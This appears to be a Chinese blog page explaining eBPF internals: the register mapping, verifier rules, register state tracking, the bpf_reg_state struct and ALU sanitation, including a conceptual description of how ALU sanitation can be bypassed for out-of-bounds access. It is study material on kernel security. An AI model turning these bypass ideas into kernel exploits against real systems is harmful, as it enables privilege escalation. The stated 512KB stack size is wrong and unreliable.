    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>eBPF 虚拟机一共有 11 个 64 位寄存器，一个程序计数器（PC）与一个固定大小的堆栈（通常为 512KB），在 x86 架构下的对应关系如下：</p>
<div class="table-wrapper">
  <table>
    <thead>
        <tr>
            <th style="text-align: center">eBPF 寄存器</th>
            <th style="text-align: center">映射 x86_64 寄存器</th>
            <th style="text-align: center">用途</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td style="text-align: center">R0</td>
            <td style="text-align: center">rax</td>
            <td style="text-align: center">函数返回值</td>
        </tr>
        <tr>
            <td style="text-align: center">R1</td>
            <td style="text-align: center">rdi</td>
            <td style="text-align: center">argv1</td>
        </tr>
        <tr>
            <td style="text-align: center">R2</td>
            <td style="text-align: center">rsi</td>
            <td style="text-align: center">argv2</td>
        </tr>
        <tr>
            <td style="text-align: center">R3</td>
            <td style="text-align: center">rdx</td>
            <td style="text-align: center">argv3</td>
        </tr>
        <tr>
            <td style="text-align: center">R4</td>
            <td style="text-align: center">rcx</td>
            <td style="text-align: center">argv4</td>
        </tr>
        <tr>
            <td style="text-align: center">R5</td>
            <td style="text-align: center">r8</td>
            <td style="text-align: center">argv5</td>
        </tr>
        <tr>
            <td style="text-align: center">R6</td>
            <td style="text-align: center">rbx</td>
            <td style="text-align: center">callee 保存</td>
        </tr>
        <tr>
            <td style="text-align: center">R7</td>
            <td style="text-align: center">r13</td>
            <td style="text-align: center">callee 保存</td>
        </tr>
        <tr>
            <td style="text-align: center">R8</td>
            <td style="text-align: center">r14</td>
            <td style="text-align: center">callee 保存</td>
        </tr>
        <tr>
            <td style="text-align: center">R9</td>
            <td style="text-align: center">r15</td>
            <td style="text-align: center">callee 保存</td>
        </tr>
        <tr>
            <td style="text-align: center">R10（只读）</td>
            <td style="text-align: center">rbp</td>
            <td style="text-align: center">堆栈指针寄存器</td>
        </tr>
    </tbody>
  </table>
</div><h3 class="heading-element" id="verifier"><span>verifier</span>
  <a href="#verifier" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><code>verifier</code>的主要工作包括：</p>
<ul>
<li>验证结构，保证循环次数，不存在死循环（早期的内核禁止循环）；清理<code>unreachable instructions</code></li>
<li>模拟执行每一条指令，观察寄存器和栈状态的变化，确保不存越界读写等不安全行为</li>
</ul>
<h4 class="heading-element" id="寄存器状态跟踪"><span>寄存器状态跟踪</span>
  <a href="#%e5%af%84%e5%ad%98%e5%99%a8%e7%8a%b6%e6%80%81%e8%b7%9f%e8%b8%aa" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><strong>状态类型</strong></p>
<p><code>verifier</code>会跟踪每个寄存器的状态，给每个寄存器分配一个<code>struct bpf_reg_state</code>，每个寄存器都有类型(type)，类型可以分为以下三大类：</p>
<ul>
<li>未初始化寄存器(not_init)，还没经过赋值操作，使用会导致验证失败</li>
<li>标量寄存器(scalar_value)，被赋予了整型值，能进行算数运算，不能作为指针进行内存访问</li>
<li>指针寄存器(pointer type)，该寄存器为一个指针，verifier 会检查内存访问是否超出指针允许的范围</li>
</ul>
<h4 class="heading-element" id="一些规则"><span>一些规则</span>
  <a href="#%e4%b8%80%e4%ba%9b%e8%a7%84%e5%88%99" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><ul>
<li>
<p>SCALAR 不能直接当指针用</p>
</li>
<li>
<p>允许<code>ptr + known_safe_offset</code>，<code>ptr + unknown_scalar</code>之后不能解引用（要进行边界检查才能解引用）</p>
</li>
<li>
<p>ptr + ptr 禁止，<code>ptr - ptr</code>有条件允许：如果两个指针指向同一个内存对象，Verifier 允许相减来计算距离（offset）。结果会变成 <code>SCALAR</code>。但不同对象的指针相减是禁止的。</p>
</li>
<li>
<p>pointer 不能做任意算术运算，Mul, Div, Mod, Shift, And, Or, Xor 对指针都是非法的。只有 Add/Sub (offset) 是合法的。</p>
</li>
<li>
<p>ALU32 会 <strong>清零高 32 位</strong></p>
<p>未初始化的寄存器 / stack 禁止使用（程序开始时，寄存器r1已经初始化为一个指针，类型为<code>PTR_TO_CTX</code>）</p>
</li>
<li>
<p>不能把一个<strong>内核指针</strong>（如 <code>sk_buff</code> 的地址）直接存到 Map 里，让用户态读取。</p>
</li>
</ul>
<h3 class="heading-element" id="alu-sanitation"><span>ALU Sanitation</span>
  <a href="#alu-sanitation" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>在对一个指针类型寄存器进行加减某个<code>offset</code>时，一些指令会被加上去 ，验证<code>offset</code>的合法性，也就是保证这个指针的活动范围</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit - 1); // -1 in old kernel versions
</span></span><span class="line"><span class="cl">BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);
</span></span><span class="line"><span class="cl">BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);
</span></span><span class="line"><span class="cl">BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);
</span></span><span class="line"><span class="cl">BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);
</span></span><span class="line"><span class="cl">BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);</span></span></code></pre></td></tr></table></div>
</div>
</div><p>简单来说，指针类型寄存器有一个活动范围，指向栈的寄存器活动范围就在栈中，不能通过加减某个<code>offset</code>从而指到别的地方去</p>
<p>绕过<code>ALU Sanitation</code>分两种情况：</p>
<ul>
<li>如果有一个指针指向<code>0x1000</code>，它允许最大指向<code>0x1500</code>，最小指向<code>0x500</code>。通过了某些漏洞，我们让<code>verifier</code>认为这个指针还是<code>0x1000</code>，但是它实际上是<code>0x500</code>，那么这个寄存器实际上的活动范围就是<code>0 - 0x1000</code>，能够越界读到前面的东西</li>
<li>当这个指针已经在它活动范围的边界的时候，上面的这串指令又把边界减去了1（aux-&gt;alu_limit - 1）,这就导致了无符号数的回绕，边界变成了<code>0xFFFFFFFF</code>，这样我们就能让这个指针指向很大一个范围了</li>
</ul>
<blockquote>
<p>在一些新的内核这个bug被修复了</p>
</blockquote>
<ul>
<li>bpf_reg_state：维护了BPF寄存器的状态。</li>
</ul>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_reg_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* 各字段的顺序是重要的.  参见 states_equal() */</span>
</span></span><span class="line"><span class="cl">	<span class="k">enum</span> <span class="n">bpf_reg_type</span> <span class="n">type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* 指针偏移的固定部分, 仅指针类型 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">s32</span> <span class="n">off</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/* 当 type == PTR_TO_PACKET 时可用 */</span>
</span></span><span class="line"><span class="cl">		<span class="kt">int</span> <span class="n">range</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/* 当 type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *   PTR_TO_MAP_VALUE_OR_NULL 时可用
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="cm">/* 为了从外部映射中区分映射查找
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * map_uid 对于指向内部映射的寄存器为非 0 值
</span></span></span><span class="line"><span class="cl"><span class="cm">			 */</span>
</span></span><span class="line"><span class="cl">			<span class="n">u32</span> <span class="n">map_uid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/* for PTR_TO_BTF_ID */</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">struct</span> <span class="n">btf</span> <span class="o">*</span><span class="n">btf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="n">u32</span> <span class="n">btf_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="p">{</span> <span class="cm">/* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */</span>
</span></span><span class="line"><span class="cl">			<span class="n">u32</span> <span class="n">mem_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="n">u32</span> <span class="n">dynptr_id</span><span class="p">;</span> <span class="cm">/* for dynptr slices */</span>
</span></span><span class="line"><span class="cl">		<span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/* For dynptr stack slots */</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">enum</span> <span class="n">bpf_dynptr_type</span> <span class="n">type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="cm">/* 一个 dynptr 为 16 字节， 故其占用 2 个 stack slots.
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * 我们需要追踪哪一个 slot 为第一个防止用户可能尝试传入一个从
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * dynptr 的第二个 slot 开始的地址的情况的 slot.
</span></span></span><span class="line"><span class="cl"><span class="cm">			 */</span>
</span></span><span class="line"><span class="cl">			<span class="kt">bool</span> <span class="n">first_slot</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="n">dynptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/* 以上任意一个的最大尺寸. */</span>
</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">raw1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">raw2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="n">raw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">u32</span> <span class="n">subprogno</span><span class="p">;</span> <span class="cm">/* for PTR_TO_FUNC */</span>
</span></span><span class="line"><span class="cl">	<span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* 对于标量类型 (SCALAR_VALUE), 其表示我们对实际值的了解.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 对于指针类型, 其表示从被指向对象的偏移的可变部分，
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 且同与我们有相同 id 的所有 bpf_reg_states 共享.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">tnum</span> <span class="n">var_off</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* 被用于确定任何使用该寄存器的内存访问是否将导致一个坏的访问.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * These refer to the same value as var_off, not necessarily the actual
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * contents of the register.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">s64</span> <span class="n">smin_value</span><span class="p">;</span> <span class="cm">/* 最小可能值 (s64) */</span>
</span></span><span class="line"><span class="cl">	<span class="n">s64</span> <span class="n">smax_value</span><span class="p">;</span> <span class="cm">/* 最大可能值 (s64) */</span>
</span></span><span class="line"><span class="cl">	<span class="n">u64</span> <span class="n">umin_value</span><span class="p">;</span> <span class="cm">/* 最小可能值 (u64) */</span>
</span></span><span class="line"><span class="cl">	<span class="n">u64</span> <span class="n">umax_value</span><span class="p">;</span> <span class="cm">/* 最大可能值 (u64) */</span>
</span></span><span class="line"><span class="cl">	<span class="n">s32</span> <span class="n">s32_min_value</span><span class="p">;</span> <span class="cm">/* 最小可能值 (s32) */</span>
</span></span><span class="line"><span class="cl">	<span class="n">s32</span> <span class="n">s32_max_value</span><span class="p">;</span> <span class="cm">/* 最大可能值 (s32) */</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">u32_min_value</span><span class="p">;</span> <span class="cm">/* 最小可能值 (u32) */</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">u32_max_value</span><span class="p">;</span> <span class="cm">/* 最大可能值 (u32) */</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* 对于 PTR_TO_PACKET, 用以找到有着相同变量偏移的其他指针，
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 由此他们可以共享范围信息.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 对于 PTR_TO_MAP_VALUE_OR_NULL 其被用于共享我们来自哪一个映射值
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 当其一被测试于 != NULL.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 对于 PTR_TO_MEM_OR_NULL 其被用于辨识内存分配以追踪其释放.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 对于 PTR_TO_SOCKET 其被用于共享哪一个指针保留了对 socket 的相同引用，
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 以确定合适的引用释放.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 对于作为 dynptrs 的 stack slots, 其被用于追踪对 dynptr的引用
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 以确定合适的引用释放.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* PTR_TO_SOCKET 与 PTR_TO_TCP_SOCK 可以为一个返回自一个 pointer-cast helper
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * bpf_sk_fullsock() 与 bpf_tcp_sock() 的指针 .
</span></span></span><span class="line"><span class="cl"><span class="cm">	 *
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 考虑如下情况， &#34;sk&#34; 为一个返回自 &#34;sk = bpf_sk_lookup_tcp();&#34; 的引用计数指针:
</span></span></span><span class="line"><span class="cl"><span class="cm">	 *
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 1: sk = bpf_sk_lookup_tcp();
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 2: if (!sk) { return 0; }
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 3: fullsock = bpf_sk_fullsock(sk);
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 4: if (!fullsock) { bpf_sk_release(sk); return 0; }
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 5: tp = bpf_tcp_sock(fullsock);
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 6: if (!tp) { bpf_sk_release(sk); return 0; }
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 7: bpf_sk_release(sk);
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 8: snd_cwnd = tp-&gt;snd_cwnd;  // verifier 将抗议
</span></span></span><span class="line"><span class="cl"><span class="cm">	 *
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 在第 7 行的 bpf_sk_release(sk) 之后, &#34;fullsock&#34; 指针与
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * &#34;tp&#34; 指针都应当被无效化.  为了这么做, 保存 &#34;fullsock&#34; 与 &#34;sk&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 的寄存器需要记住在 ref_obj_id 中的原始引用计数指针 id(即， sk_reg-&gt;id)
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 这样 verifier 便能重置所有 ref_obj_id 匹配 sk_reg-&gt;id 的寄存器
</span></span></span><span class="line"><span class="cl"><span class="cm">	 *
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * sk_reg-&gt;ref_obj_id 在第 1 行被设为 sk_reg-&gt;id.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * sk_reg-&gt;id 将仅作为 NULL-marking 的目的保持.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 在 NULL-marking 完成后, sk_reg-&gt;id 可以被重置为 0.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 *
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 在第 3 行的 &#34;fullsock = bpf_sk_fullsock(sk);&#34; 之后,
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * fullsock_reg-&gt;ref_obj_id 被设为 sk_reg-&gt;ref_obj_id.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 *
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 在第 5 行的 &#34;tp = bpf_tcp_sock(fullsock);&#34; 之后,
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * tp_reg-&gt;ref_obj_id 被设为 fullsock_reg-&gt;ref_obj_id
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 与 sk_reg-&gt;ref_obj_id 一致.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 *
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 从 verifier 的角度而言, 若 sk, fullsock 与 tp 都非 NULL,
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 他们为有着不同 reg-&gt;type 的相同指针.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 特别地, bpf_sk_release(tp) 也被允许且有着与 bpf_sk_release(sk) 
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 相同的影响.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">ref_obj_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* 用于存活检查的亲子链 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">bpf_reg_state</span> <span class="o">*</span><span class="n">parent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* 在被调用方中两个寄存器可以同时为 PTR_TO_STACK 如同 R1=fp-8 与 R2=fp-8,
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 但其一指向该函数栈而另一指向调用方的栈. 为了区分他们 &#39;frameno&#39; 被使用，
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 其为一个指向 bpf_func_state 的 bpf_verifier_state-&gt;frame[] 数组中的下标.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">u32</span> <span class="n">frameno</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* 追踪子寄存器（subreg）定义. 保存的值为写入 insn 的 insn_idx.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * 这是安全的因为 subreg_def 在任何仅在主校验结束后发生的 insn 修补前被使用.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">s32</span> <span class="n">subreg_def</span><span class="p">;</span>
